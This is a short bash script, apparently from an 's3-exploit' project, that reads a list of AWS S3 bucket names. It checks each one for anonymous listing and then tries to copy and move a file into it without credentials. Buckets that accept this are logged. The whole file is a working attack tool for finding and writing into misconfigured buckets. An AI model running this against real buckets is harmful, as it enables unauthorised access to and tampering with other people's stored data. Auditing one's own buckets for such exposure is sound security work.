#!/usr/bin/env bash

########################################################
# Author: Aju Tamang                                   #
# Info: Script for setting up vulnerable webapp        #
# License: MIT (c)                                     #
########################################################



########################################################
# Script to check out the aws bucket vulnerability     #
########################################################

GREEN="32"
BOLDGREEN="\e[1;${GREEN}m"
ENDCOLOR="\e[0m"

printf """${BOLDGREEN}

  _____ ____  ______            _       _ _       
 / ____|___ \|  ____|          | |     (_) |      
| (___   __) | |__  __  ___ __ | | ___  _| |_ ___ 
 \___ \ |__ <|  __| \ \/ / '_ \| |/ _ \| | __/ __|
 ____) |___) | |____ >  <| |_) | | (_) | | |_\__ \
|_____/|____/|______/_/\_\ .__/|_|\___/|_|\__|___/
                         | |                      
                         |_|                      

Author: @aju100
Url: https://github.com/Aju100/s3-exploit
Blog: csaju.com/blog
"""

function checks3(){
    echo -e "${BOLDGREEN}Checking public S3 buckets. ðŸ˜ˆ ðŸ˜ˆ ðŸ˜ˆ ${ENDCOLOR}"
    while read -r line ; do 
        aws s3 ls $line --no-sign-request && echo $line && echo $line>>s3_exposure_buckets.txt;    
    done < s3_buckets.txt
}

function copyfile(){
    echo -e "${BOLDGREEN}Trying to copy file to S3 buckets. ðŸ˜ˆ ðŸ˜ˆ ðŸ˜ˆ ${ENDCOLOR}" 
    while read -r line ; do
        touch 1.html && aws s3 cp 1.html s3://$line --no-sign-request && echo $line && echo $line>>s3_copy_logs.txt; 
    done < s3_buckets.txt
}

function movefile(){
    echo -e "${BOLDGREEN}Trying to move file to S3 buckets. ðŸ˜ˆ ðŸ˜ˆ ðŸ˜ˆ ${ENDCOLOR}"
    while read -r line ; do 
        touch 1.html && aws s3 mv 1.html s3://$line --no-sign-request && echo $line && echo $line>>s3_move_logs.txt && touch 1.html;    
    done < s3_buckets.txt
}


checks3
copyfile
movefile